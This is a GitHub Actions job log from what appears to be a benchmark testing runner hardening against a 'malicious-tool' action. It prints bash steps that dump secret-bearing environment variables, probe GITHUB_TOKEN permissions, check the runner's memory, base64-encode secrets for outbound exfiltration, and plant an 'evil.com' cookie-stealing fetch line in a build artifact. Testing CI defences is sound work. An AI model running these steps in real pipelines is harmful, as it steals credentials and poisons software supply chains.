@@ -1,0 +1,420 @@
+﻿2026-04-02T19:45:44.0933046Z Current runner version: '2.333.1'
+2026-04-02T19:45:44.0965675Z ##[group]Runner Image Provisioner
+2026-04-02T19:45:44.0966974Z Hosted Compute Agent
+2026-04-02T19:45:44.0967803Z Version: 20260213.493
+2026-04-02T19:45:44.0968785Z Commit: 5c115507f6dd24b8de37d8bbe0bb4509d0cc0fa3
+2026-04-02T19:45:44.0970182Z Build Date: 2026-02-13T00:28:41Z
+2026-04-02T19:45:44.0971246Z Worker ID: {d7180b51-9891-4def-8e59-e3fefe59b056}
+2026-04-02T19:45:44.0972734Z Azure Region: centralus
+2026-04-02T19:45:44.0973620Z ##[endgroup]
+2026-04-02T19:45:44.0975903Z ##[group]Operating System
+2026-04-02T19:45:44.0976797Z Ubuntu
+2026-04-02T19:45:44.0977477Z 24.04.4
+2026-04-02T19:45:44.0978377Z LTS
+2026-04-02T19:45:44.0979108Z ##[endgroup]
+2026-04-02T19:45:44.0979992Z ##[group]Runner Image
+2026-04-02T19:45:44.0981078Z Image: ubuntu-24.04
+2026-04-02T19:45:44.0982253Z Version: 20260323.65.1
+2026-04-02T19:45:44.0984391Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20260323.65/images/ubuntu/Ubuntu2404-Readme.md
+2026-04-02T19:45:44.0987144Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20260323.65
+2026-04-02T19:45:44.0988963Z ##[endgroup]
+2026-04-02T19:45:44.0991315Z ##[group]GITHUB_TOKEN Permissions
+2026-04-02T19:45:44.0994328Z Actions: read
+2026-04-02T19:45:44.0995229Z Contents: read
+2026-04-02T19:45:44.0995981Z Metadata: read
+2026-04-02T19:45:44.0996887Z SecurityEvents: write
+2026-04-02T19:45:44.0997830Z ##[endgroup]
+2026-04-02T19:45:44.1001077Z Secret source: Actions
+2026-04-02T19:45:44.1002781Z Prepare workflow directory
+2026-04-02T19:45:44.1379045Z Prepare all required actions
+2026-04-02T19:45:44.1436843Z Getting action download info
+2026-04-02T19:45:44.4967119Z Download action repository 'step-security/harden-runner@v2' (SHA:fa2e9d605c4eeb9fcad4c99c224cee0c6c7f3594)
+2026-04-02T19:45:45.3197474Z Download action repository 'actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11' (SHA:b4ffde65f46336ab88eb53be808477a3936bae11)
+2026-04-02T19:45:45.4931571Z Complete job name: analyze-and-test
+2026-04-02T19:45:45.5624511Z ##[group]Run step-security/harden-runner@v2
+2026-04-02T19:45:45.5625607Z with:
+2026-04-02T19:45:45.5626044Z   egress-policy: block
+2026-04-02T19:45:45.5626609Z   allowed-endpoints: github.com:443 api.github.com:443
+
+2026-04-02T19:45:45.5627462Z   token: ***
+2026-04-02T19:45:45.5627998Z   disable-telemetry: false
+2026-04-02T19:45:45.5628636Z   disable-sudo: false
+2026-04-02T19:45:45.5629149Z   disable-sudo-and-containers: false
+2026-04-02T19:45:45.5629696Z   disable-file-monitoring: false
+2026-04-02T19:45:45.5630475Z ##[endgroup]
+2026-04-02T19:45:45.6837701Z [harden-runner] pre-step
+2026-04-02T19:45:45.6838846Z [!] Current Configuration: 
+2026-04-02T19:45:45.6842732Z {"repo":"AlphaSudo/sbtr-benchmark","run_id":"23918796175","correlation_id":"fba80278-079a-4578-bc7c-63f0ce54cbb8","working_directory":"/home/runner/work/sbtr-benchmark/sbtr-benchmark","api_url":"https://agent.api.stepsecurity.io/v1","allowed_endpoints":"github.com:443 api.github.com:443","egress_policy":"block","disable_telemetry":false,"disable_sudo":false,"disable_sudo_and_containers":false,"disable_file_monitoring":false,"private":false,"is_github_hosted":true,"is_debug":false,"one_time_key":""}
+2026-04-02T19:45:45.6845785Z 
+2026-04-02T19:45:45.7044362Z [command]/usr/bin/tar --posix -cf cache.tzst --exclude cache.tzst -P -C /home/runner/work/sbtr-benchmark/sbtr-benchmark --files-from manifest.txt --use-compress-program zstdmt
+2026-04-02T19:45:45.8593607Z Failed to save: Unable to reserve cache with key harden-runner-cacheKey, another job may be creating this cache.
+2026-04-02T19:45:45.8600506Z -1
+2026-04-02T19:45:45.8602243Z cache version: v2
+2026-04-02T19:45:45.8603483Z cacheFilePath /home/runner/work/_actions/step-security/harden-runner/v2/dist/pre/cache.txt
+2026-04-02T19:45:45.9599026Z Adding cacheHost: productionresultssa4.blob.core.windows.net:443 to allowed-endpoints
+2026-04-02T19:45:45.9601397Z [32mView security insights and recommended policy at:[0m
+2026-04-02T19:45:45.9604082Z https://app.stepsecurity.io/github/AlphaSudo/sbtr-benchmark/actions/runs/23918796175
+2026-04-02T19:45:45.9606588Z RUNNER_NAME: GitHub Actions 1000000370
+2026-04-02T19:45:46.5417097Z Runner IP Address: 52.165.59.4
+2026-04-02T19:45:46.5419207Z Step Security Job Correlation ID: fba80278-079a-4578-bc7c-63f0ce54cbb8
+2026-04-02T19:45:46.5609810Z [!] Checking TLS_STATUS: AlphaSudo
+2026-04-02T19:45:46.7486909Z [!] TLS_NOT_ENABLED: AlphaSudo
+2026-04-02T19:45:47.1115149Z ✅ Checksum verification passed. checksum=1531bda40026b799b0704d0f775c372653a91fe436628fa8b416849d9c0707a8
+2026-04-02T19:45:47.1188513Z [command]/usr/bin/tar xz --warning=no-unknown-keyword --overwrite -C /home/runner/work/_temp/ee731df8-757d-4964-a398-afcd3a042ef5 -f /home/runner/work/_temp/f68b2aff-4c60-4e29-82d1-4bb952d5371d
+2026-04-02T19:45:52.8761367Z Initialized
+2026-04-02T19:45:52.8951915Z ##[group]Run step-security/harden-runner@v2
+2026-04-02T19:45:52.8952515Z with:
+2026-04-02T19:45:52.8952752Z   egress-policy: block
+2026-04-02T19:45:52.8953079Z   allowed-endpoints: github.com:443 api.github.com:443
+
+2026-04-02T19:45:52.8953659Z   token: ***
+2026-04-02T19:45:52.8953896Z   disable-telemetry: false
+2026-04-02T19:45:52.8954169Z   disable-sudo: false
+2026-04-02T19:45:52.8954440Z   disable-sudo-and-containers: false
+2026-04-02T19:45:52.8954759Z   disable-file-monitoring: false
+2026-04-02T19:45:52.8955043Z env:
+2026-04-02T19:45:52.8955262Z   STATE_disableSudo: false
+2026-04-02T19:45:52.8955542Z   STATE_disableSudoAndContainers: false
+2026-04-02T19:45:52.8955851Z   STATE_monitorStatusCode: 200
+2026-04-02T19:45:52.8956134Z   STATE_addSummary: true
+2026-04-02T19:45:52.8956489Z   STATE_correlation_id: fba80278-079a-4578-bc7c-63f0ce54cbb8
+2026-04-02T19:45:52.8956837Z   STATE_isTLS: false
+2026-04-02T19:45:52.8957096Z ##[endgroup]
+2026-04-02T19:45:52.9640883Z [harden-runner] main-step
+2026-04-02T19:45:52.9646262Z [32mView security insights and recommended policy at:[0m
+2026-04-02T19:45:52.9646910Z https://app.stepsecurity.io/github/AlphaSudo/sbtr-benchmark/actions/runs/23918796175
+2026-04-02T19:45:52.9812773Z ##[group]Run actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+2026-04-02T19:45:52.9813334Z with:
+2026-04-02T19:45:52.9813586Z   repository: AlphaSudo/sbtr-benchmark
+2026-04-02T19:45:52.9814093Z   token: ***
+2026-04-02T19:45:52.9814329Z   ssh-strict: true
+2026-04-02T19:45:52.9814573Z   persist-credentials: true
+2026-04-02T19:45:52.9814846Z   clean: true
+2026-04-02T19:45:52.9815093Z   sparse-checkout-cone-mode: true
+2026-04-02T19:45:52.9815405Z   fetch-depth: 1
+2026-04-02T19:45:52.9815679Z   fetch-tags: false
+2026-04-02T19:45:52.9815917Z   show-progress: true
+2026-04-02T19:45:52.9816148Z   lfs: false
+2026-04-02T19:45:52.9816443Z   submodules: false
+2026-04-02T19:45:52.9816720Z   set-safe-directory: true
+2026-04-02T19:45:52.9816981Z ##[endgroup]
+2026-04-02T19:45:53.0653129Z Syncing repository: AlphaSudo/sbtr-benchmark
+2026-04-02T19:45:53.0656128Z ##[group]Getting Git version info
+2026-04-02T19:45:53.0657089Z Working directory is '/home/runner/work/sbtr-benchmark/sbtr-benchmark'
+2026-04-02T19:45:53.0658320Z [command]/usr/bin/git version
+2026-04-02T19:45:53.0683849Z git version 2.53.0
+2026-04-02T19:45:53.0710269Z ##[endgroup]
+2026-04-02T19:45:53.0723732Z Temporarily overriding HOME='/home/runner/work/_temp/72d1accd-ec79-4314-8c78-74205da753ff' before making global git config changes
+2026-04-02T19:45:53.0727212Z Adding repository directory to the temporary git global config as a safe directory
+2026-04-02T19:45:53.0727963Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/sbtr-benchmark/sbtr-benchmark
+2026-04-02T19:45:53.0761394Z Deleting the contents of '/home/runner/work/sbtr-benchmark/sbtr-benchmark'
+2026-04-02T19:45:53.0765357Z ##[group]Initializing the repository
+2026-04-02T19:45:53.0768346Z [command]/usr/bin/git init /home/runner/work/sbtr-benchmark/sbtr-benchmark
+2026-04-02T19:45:53.0893278Z hint: Using 'master' as the name for the initial branch. This default branch name
+2026-04-02T19:45:53.0894516Z hint: will change to "main" in Git 3.0. To configure the initial branch name
+2026-04-02T19:45:53.0895902Z hint: to use in all of your new repositories, which will suppress this warning,
+2026-04-02T19:45:53.0896759Z hint: call:
+2026-04-02T19:45:53.0897068Z hint:
+2026-04-02T19:45:53.0897603Z hint: 	git config --global init.defaultBranch <name>
+2026-04-02T19:45:53.0898046Z hint:
+2026-04-02T19:45:53.0898455Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+2026-04-02T19:45:53.0899262Z hint: 'development'. The just-created branch can be renamed via this command:
+2026-04-02T19:45:53.0899844Z hint:
+2026-04-02T19:45:53.0900233Z hint: 	git branch -m <name>
+2026-04-02T19:45:53.0900570Z hint:
+2026-04-02T19:45:53.0901019Z hint: Disable this message with "git config set advice.defaultBranchName false"
+2026-04-02T19:45:53.0901833Z Initialized empty Git repository in /home/runner/work/sbtr-benchmark/sbtr-benchmark/.git/
+2026-04-02T19:45:53.0907328Z [command]/usr/bin/git remote add origin https://github.com/AlphaSudo/sbtr-benchmark
+2026-04-02T19:45:53.0943277Z ##[endgroup]
+2026-04-02T19:45:53.0944216Z ##[group]Disabling automatic garbage collection
+2026-04-02T19:45:53.0947554Z [command]/usr/bin/git config --local gc.auto 0
+2026-04-02T19:45:53.0981821Z ##[endgroup]
+2026-04-02T19:45:53.0983007Z ##[group]Setting up auth
+2026-04-02T19:45:53.0988435Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-04-02T19:45:53.1019813Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-04-02T19:45:53.1344018Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-04-02T19:45:53.1373616Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-04-02T19:45:53.1613214Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
+2026-04-02T19:45:53.1650134Z ##[endgroup]
+2026-04-02T19:45:53.1650825Z ##[group]Fetching the repository
+2026-04-02T19:45:53.1659610Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --no-recurse-submodules --depth=1 origin +3688a908fec38288db015c3adaab31eea5e28e70:refs/remotes/origin/main
+2026-04-02T19:45:53.4744110Z From https://github.com/AlphaSudo/sbtr-benchmark
+2026-04-02T19:45:53.4745406Z  * [new ref]         3688a908fec38288db015c3adaab31eea5e28e70 -> origin/main
+2026-04-02T19:45:53.4778529Z ##[endgroup]
+2026-04-02T19:45:53.4779126Z ##[group]Determining the checkout info
+2026-04-02T19:45:53.4781086Z ##[endgroup]
+2026-04-02T19:45:53.4781643Z ##[group]Checking out the ref
+2026-04-02T19:45:53.4785375Z [command]/usr/bin/git checkout --progress --force -B main refs/remotes/origin/main
+2026-04-02T19:45:53.4891415Z Switched to a new branch 'main'
+2026-04-02T19:45:53.4893646Z branch 'main' set up to track 'origin/main'.
+2026-04-02T19:45:53.4898311Z ##[endgroup]
+2026-04-02T19:45:53.4934830Z [command]/usr/bin/git log -1 --format='%H'
+2026-04-02T19:45:53.4960198Z '3688a908fec38288db015c3adaab31eea5e28e70'
+2026-04-02T19:45:53.5211252Z Prepare all required actions
+2026-04-02T19:45:53.5393374Z ##[group]Run ./.github/actions/malicious-tool
+2026-04-02T19:45:53.5393675Z ##[endgroup]
+2026-04-02T19:45:53.5483276Z ##[group]Run FILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"
+2026-04-02T19:45:53.5484133Z [36;1mFILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"[0m
+2026-04-02T19:45:53.5484684Z [36;1mecho "files=$FILES" >> "$GITHUB_OUTPUT"[0m
+2026-04-02T19:45:53.5484988Z [36;1mecho "Found source files: $FILES"[0m
+2026-04-02T19:45:53.5517140Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:53.5517492Z ##[endgroup]
+2026-04-02T19:45:53.5613497Z Found source files: src/app.js,
+2026-04-02T19:45:53.5659579Z ##[group]Run echo "========================================="
+2026-04-02T19:45:53.5659985Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:53.5660325Z [36;1mecho "ATTACK 1: Environment Variable Dump"[0m
+2026-04-02T19:45:53.5660641Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:53.5660940Z [36;1mprintenv | sort > env_dump.txt[0m
+2026-04-02T19:45:53.5661213Z [36;1mwhile IFS= read -r line; do[0m
+2026-04-02T19:45:53.5661460Z [36;1m  KEY="${line%%=*}"[0m
+2026-04-02T19:45:53.5661680Z [36;1m  case "$KEY" in[0m
+2026-04-02T19:45:53.5662365Z [36;1m    *SECRET*|*TOKEN*|*KEY*|*PASSWORD*|*CREDENTIAL*|*AWS*)[0m
+2026-04-02T19:45:53.5662886Z [36;1m      echo "FOUND SECRET: $line"[0m
+2026-04-02T19:45:53.5663135Z [36;1m      ;;[0m
+2026-04-02T19:45:53.5663331Z [36;1m    GITHUB_TOKEN)[0m
+2026-04-02T19:45:53.5663596Z [36;1m      echo "FOUND GITHUB_TOKEN: ${line:0:30}..."[0m
+2026-04-02T19:45:53.5663882Z [36;1m      ;;[0m
+2026-04-02T19:45:53.5664057Z [36;1m  esac[0m
+2026-04-02T19:45:53.5664245Z [36;1mdone < env_dump.txt[0m
+2026-04-02T19:45:53.5664685Z [36;1mSECRET_COUNT="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AWS' | wc -l || true)"[0m
+2026-04-02T19:45:53.5665228Z [36;1mecho "Total secrets found in environment: $SECRET_COUNT"[0m
+2026-04-02T19:45:53.5690811Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:53.5691149Z ##[endgroup]
+2026-04-02T19:45:53.5736630Z =========================================
+2026-04-02T19:45:53.5737053Z ATTACK 1: Environment Variable Dump
+2026-04-02T19:45:53.5737371Z =========================================
+2026-04-02T19:45:53.5806579Z Total secrets found in environment: 0
+2026-04-02T19:45:53.5838396Z ##[group]Run echo "========================================="
+2026-04-02T19:45:53.5838790Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:53.5839130Z [36;1mecho "ATTACK 2: GITHUB_TOKEN Permission Check"[0m
+2026-04-02T19:45:53.5839478Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:53.5839761Z [36;1mif [ -n "$GITHUB_TOKEN" ]; then[0m
+2026-04-02T19:45:53.5840567Z [36;1m  REPO_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:45:53.5841863Z [36;1m  BRANCH_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/branches" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:45:53.5843691Z [36;1m  RELEASE_STATUS="$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/releases" -d '{"tag_name":"test-probe","draft":true}' -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:45:53.5844684Z [36;1m  echo "Token exists: YES"[0m
+2026-04-02T19:45:53.5844982Z [36;1m  echo "Repo access status: $REPO_STATUS"[0m
+2026-04-02T19:45:53.5845297Z [36;1m  echo "Can read branches: $BRANCH_STATUS"[0m
+2026-04-02T19:45:53.5845822Z [36;1m  echo "Can create releases: $RELEASE_STATUS"[0m
+2026-04-02T19:45:53.5846116Z [36;1melse[0m
+2026-04-02T19:45:53.5846337Z [36;1m  echo "No GITHUB_TOKEN found in environment"[0m
+2026-04-02T19:45:53.5846615Z [36;1mfi[0m
+2026-04-02T19:45:53.5872826Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:53.5873154Z env:
+2026-04-02T19:45:53.5873558Z   GITHUB_TOKEN: ***
+2026-04-02T19:45:53.5873753Z ##[endgroup]
+2026-04-02T19:45:53.5926017Z =========================================
+2026-04-02T19:45:53.5926337Z ATTACK 2: GITHUB_TOKEN Permission Check
+2026-04-02T19:45:53.5926614Z =========================================
+2026-04-02T19:45:54.1426154Z Token exists: YES
+2026-04-02T19:45:54.1426867Z Repo access status: 200
+2026-04-02T19:45:54.1427246Z Can read branches: 200
+2026-04-02T19:45:54.1429069Z Can create releases: 403
+2026-04-02T19:45:54.1453902Z ##[group]Run echo "========================================="
+2026-04-02T19:45:54.1454310Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.1454629Z [36;1mecho "ATTACK 3: Process Memory Scan"[0m
+2026-04-02T19:45:54.1454950Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.1455334Z [36;1mRUNNER_PID="$(pgrep -f 'Runner.Worker' || echo 'none')"[0m
+2026-04-02T19:45:54.1455708Z [36;1mecho "Runner.Worker PID: $RUNNER_PID"[0m
+2026-04-02T19:45:54.1456096Z [36;1mif [ "$RUNNER_PID" != "none" ] && [ -r "/proc/$RUNNER_PID/maps" ]; then[0m
+2026-04-02T19:45:54.1456525Z [36;1m  echo "Can read /proc/$RUNNER_PID/maps: YES"[0m
+2026-04-02T19:45:54.1456943Z [36;1m  READABLE_REGIONS="$(grep ' r' "/proc/$RUNNER_PID/maps" | wc -l || true)"[0m
+2026-04-02T19:45:54.1457390Z [36;1m  echo "Readable memory regions: $READABLE_REGIONS"[0m
+2026-04-02T19:45:54.1457747Z [36;1m  echo "Memory dump capability: CONFIRMED"[0m
+2026-04-02T19:45:54.1458038Z [36;1melse[0m
+2026-04-02T19:45:54.1458258Z [36;1m  echo "Memory dump capability: BLOCKED"[0m
+2026-04-02T19:45:54.1458540Z [36;1mfi[0m
+2026-04-02T19:45:54.1485356Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:54.1485706Z ##[endgroup]
+2026-04-02T19:45:54.1532234Z =========================================
+2026-04-02T19:45:54.1532739Z ATTACK 3: Process Memory Scan
+2026-04-02T19:45:54.1533123Z =========================================
+2026-04-02T19:45:54.1704902Z Runner.Worker PID: 2062
+2026-04-02T19:45:54.1705332Z Can read /proc/2062/maps: YES
+2026-04-02T19:45:54.1738201Z Readable memory regions: 875
+2026-04-02T19:45:54.1738740Z Memory dump capability: CONFIRMED
+2026-04-02T19:45:54.1758495Z ##[group]Run echo "========================================="
+2026-04-02T19:45:54.1758890Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.1759261Z [36;1mecho "ATTACK 4: Exfiltration Attempt"[0m
+2026-04-02T19:45:54.1759589Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.1760046Z [36;1mPAYLOAD="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|AWS' | base64 -w 0 || true)"[0m
+2026-04-02T19:45:54.1760558Z [36;1mif [ -n "$PAYLOAD" ]; then[0m
+2026-04-02T19:45:54.1760890Z [36;1m  echo "Encoded payload ready (${#PAYLOAD} bytes)"[0m
+2026-04-02T19:45:54.1761214Z [36;1m  echo "Base64 payload:"[0m
+2026-04-02T19:45:54.1761468Z [36;1m  echo "$PAYLOAD"[0m
+2026-04-02T19:45:54.1761693Z [36;1melse[0m
+2026-04-02T19:45:54.1761920Z [36;1m  echo "No secrets found to exfiltrate"[0m
+2026-04-02T19:45:54.1762532Z [36;1mfi[0m
+2026-04-02T19:45:54.1763104Z [36;1mEXFIL_TEST="$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://httpbin.org/post -d "data=test_exfil" 2>/dev/null || echo "blocked")"[0m
+2026-04-02T19:45:54.1763784Z [36;1mecho "Outbound HTTP to external server: $EXFIL_TEST"[0m
+2026-04-02T19:45:54.1789351Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:54.1789697Z ##[endgroup]
+2026-04-02T19:45:54.1834477Z =========================================
+2026-04-02T19:45:54.1834979Z ATTACK 4: Exfiltration Attempt
+2026-04-02T19:45:54.1835632Z =========================================
+2026-04-02T19:45:54.1863557Z No secrets found to exfiltrate
+2026-04-02T19:45:54.1940698Z Outbound HTTP to external server: 000blocked
+2026-04-02T19:45:54.1966643Z ##[group]Run echo "========================================="
+2026-04-02T19:45:54.1967206Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.1967682Z [36;1mecho "ATTACK 5: Artifact Poisoning"[0m
+2026-04-02T19:45:54.1968135Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.1968556Z [36;1mmkdir -p build[0m
+2026-04-02T19:45:54.1968889Z [36;1mif [ ! -f "build/app.js" ]; then[0m
+2026-04-02T19:45:54.1969374Z [36;1m  echo "console.log('legitimate app');" > build/app.js[0m
+2026-04-02T19:45:54.1969888Z [36;1mfi[0m
+2026-04-02T19:45:54.1970127Z [36;1m{[0m
+2026-04-02T19:45:54.1970706Z [36;1m  echo ""[0m
+2026-04-02T19:45:54.1971185Z [36;1m  echo "// BACKDOOR: fetch('https://evil.com/steal?' + document.cookie)"[0m
+2026-04-02T19:45:54.1971777Z [36;1m} >> build/app.js[0m
+2026-04-02T19:45:54.1972449Z [36;1mecho "Artifact poisoned successfully"[0m
+2026-04-02T19:45:54.2007401Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:54.2007895Z ##[endgroup]
+2026-04-02T19:45:54.2064443Z =========================================
+2026-04-02T19:45:54.2064969Z ATTACK 5: Artifact Poisoning
+2026-04-02T19:45:54.2065398Z =========================================
+2026-04-02T19:45:54.2082555Z Artifact poisoned successfully
+2026-04-02T19:45:54.2102290Z ##[group]Run echo "========================================="
+2026-04-02T19:45:54.2102674Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.2103000Z [36;1mecho "ATTACK 6: Source Code Theft Attempt"[0m
+2026-04-02T19:45:54.2103305Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.2103865Z [36;1mFILE_COUNT="$(find . -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | wc -l || true)"[0m
+2026-04-02T19:45:54.2104482Z [36;1mTOTAL_SIZE="$(du -sh . 2>/dev/null | cut -f1 || echo 'unknown')"[0m
+2026-04-02T19:45:54.2104855Z [36;1mecho "Source files found: $FILE_COUNT"[0m
+2026-04-02T19:45:54.2105164Z [36;1mecho "Total workspace size: $TOTAL_SIZE"[0m
+2026-04-02T19:45:54.2105475Z [36;1mecho "Could compress and exfiltrate: YES"[0m
+2026-04-02T19:45:54.2130806Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:54.2131130Z ##[endgroup]
+2026-04-02T19:45:54.2176612Z =========================================
+2026-04-02T19:45:54.2177111Z ATTACK 6: Source Code Theft Attempt
+2026-04-02T19:45:54.2177529Z =========================================
+2026-04-02T19:45:54.2245824Z Source files found: 2
+2026-04-02T19:45:54.2246171Z Total workspace size: 620K
+2026-04-02T19:45:54.2246416Z Could compress and exfiltrate: YES
+2026-04-02T19:45:54.2265091Z ##[group]Run echo "========================================="
+2026-04-02T19:45:54.2265456Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.2265760Z [36;1mecho "ATTACK SUMMARY"[0m
+2026-04-02T19:45:54.2266020Z [36;1mecho "========================================="[0m
+2026-04-02T19:45:54.2266320Z [36;1mecho "1. Environment variable dump"[0m
+2026-04-02T19:45:54.2266621Z [36;1mecho "2. GITHUB_TOKEN permission probe"[0m
+2026-04-02T19:45:54.2266940Z [36;1mecho "3. Process memory access check"[0m
+2026-04-02T19:45:54.2267271Z [36;1mecho "4. Exfiltration via encoded logs + HTTP"[0m
+2026-04-02T19:45:54.2267581Z [36;1mecho "5. Build artifact poisoning"[0m
+2026-04-02T19:45:54.2267861Z [36;1mecho "6. Source code enumeration"[0m
+2026-04-02T19:45:54.2293264Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:45:54.2293597Z ##[endgroup]
+2026-04-02T19:45:54.2337074Z =========================================
+2026-04-02T19:45:54.2337690Z ATTACK SUMMARY
+2026-04-02T19:45:54.2338019Z =========================================
+2026-04-02T19:45:54.2338483Z 1. Environment variable dump
+2026-04-02T19:45:54.2339218Z 2. GITHUB_TOKEN permission probe
+2026-04-02T19:45:54.2339710Z 3. Process memory access check
+2026-04-02T19:45:54.2340126Z 4. Exfiltration via encoded logs + HTTP
+2026-04-02T19:45:54.2340576Z 5. Build artifact poisoning
+2026-04-02T19:45:54.2340932Z 6. Source code enumeration
+2026-04-02T19:45:54.2398476Z ##[group]Run node src/app.js
+2026-04-02T19:45:54.2398751Z [36;1mnode src/app.js[0m
+2026-04-02T19:45:54.2399010Z [36;1mecho "passed=true" >> "$GITHUB_OUTPUT"[0m
+2026-04-02T19:45:54.2424958Z shell: /usr/bin/bash -e {0}
+2026-04-02T19:45:54.2425191Z ##[endgroup]
+2026-04-02T19:45:54.3222417Z sbtr-benchmark v1.0.0
+2026-04-02T19:45:54.3338822Z Post job cleanup.
+2026-04-02T19:45:54.4063966Z [command]/usr/bin/git version
+2026-04-02T19:45:54.4100150Z git version 2.53.0
+2026-04-02T19:45:54.4144212Z Temporarily overriding HOME='/home/runner/work/_temp/eec186b1-931a-48ca-8dbb-1c3cbe309719' before making global git config changes
+2026-04-02T19:45:54.4145791Z Adding repository directory to the temporary git global config as a safe directory
+2026-04-02T19:45:54.4147700Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/sbtr-benchmark/sbtr-benchmark
+2026-04-02T19:45:54.4180879Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-04-02T19:45:54.4211262Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-04-02T19:45:54.4452873Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-04-02T19:45:54.4473252Z http.https://github.com/.extraheader
+2026-04-02T19:45:54.4484418Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
+2026-04-02T19:45:54.4516172Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-04-02T19:45:54.4851441Z Post job cleanup.
+2026-04-02T19:45:54.5588351Z [harden-runner] post-step
+2026-04-02T19:45:55.5611915Z log:
+2026-04-02T19:45:55.5613152Z Thu, 02 Apr 2026 19:45:48 GMT:[buildInfo] tag=v0.14.4 commit=206a878142929550e5382f5b977384f0c313f93d branch=HEAD 
+2026-04-02T19:45:55.5613920Z 
+2026-04-02T19:45:55.5614084Z Thu, 02 Apr 2026 19:45:48 GMT:read config 
+2026-04-02T19:45:55.5618527Z  &{Repo:AlphaSudo/sbtr-benchmark CorrelationId:fba80278-079a-4578-bc7c-63f0ce54cbb8 RunId:23918796175 WorkingDirectory:/home/runner/work/sbtr-benchmark/sbtr-benchmark APIURL:https://agent.api.stepsecurity.io/v1 OneTimeKey: Endpoints:map[api.github.com.:[{domainName:api.github.com. port:443}] github.com.:[{domainName:github.com. port:443}] productionresultssa4.blob.core.windows.net.:[{domainName:productionresultssa4.blob.core.windows.net. port:443}]] EgressPolicy:block DisableTelemetry:false DisableSudo:false DisableSudoAndContainers:false DisableFileMonitoring:false Private:false}
+2026-04-02T19:45:55.5623083Z 
+2026-04-02T19:45:55.5623561Z Thu, 02 Apr 2026 19:45:48 GMT:Step Security Job Correlation ID: fba80278-079a-4578-bc7c-63f0ce54cbb8
+2026-04-02T19:45:55.5624179Z 
+2026-04-02T19:45:55.5624579Z Thu, 02 Apr 2026 19:45:48 GMT:Global feature flags: {AgentType:agent-oss EnableArmour:false}
+2026-04-02T19:45:55.5625386Z Thu, 02 Apr 2026 19:45:48 GMT:initialized global feature flags
+2026-04-02T19:45:55.5625805Z 
+2026-04-02T19:45:55.5626012Z Thu, 02 Apr 2026 19:45:48 GMT:started process monitor
+2026-04-02T19:45:55.5626391Z 
+2026-04-02T19:45:55.5626596Z Thu, 02 Apr 2026 19:45:48 GMT:Monitor Processes called
